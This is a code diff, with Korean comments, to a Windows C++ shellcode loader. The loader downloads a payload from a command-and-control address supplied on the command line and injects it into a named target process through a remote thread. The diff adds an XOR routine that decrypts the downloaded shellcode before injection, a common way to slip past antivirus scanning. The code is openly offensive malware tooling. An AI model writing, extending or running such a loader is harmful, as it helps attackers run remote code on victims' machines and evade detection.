@@ -1,3 +1,4 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include <windows.h>
 #include <tlhelp32.h>
@@ -149,9 +150,17 @@ BOOL createRemoteThread(HANDLE hProc, LPVOID startAddr, LPVOID param) {
     return TRUE;
 }
 
+// 암호화된 쉘코드 복호화 함수
+void payloadDecrypt(uint8_t* data, size_t data_len, const char* key) {
+    size_t key_len = strlen(key);
+    for (size_t i = 0; i < data_len; i++) {
+        data[i] ^= key[i % key_len];
+    }
+}
+
 int wmain(int argc, wchar_t* argv[]) {
-    if (argc != 3) {
-        cout << "<process name> <c2 address>" << endl;
+    if (argc != 4) {
+        cout << "<process name> <c2 address> <xor key>" << endl;
         return 0;
     }
 
@@ -167,6 +176,11 @@ int wmain(int argc, wchar_t* argv[]) {
     DWORD outSize = 0;
     unsigned char* payload = downloadBinary(argv[2], &outSize);
     if (payload == nullptr) return 0;
+
+    // 암호화된 쉘코드 복호화
+    char xorKey[256];
+    wcstombs(xorKey, argv[3], sizeof(xorKey));
+    payloadDecrypt(payload, outSize, xorKey);
 
     // 타겟 프로세스의 메모리 공간 확보
     SIZE_T dataSize = outSize;
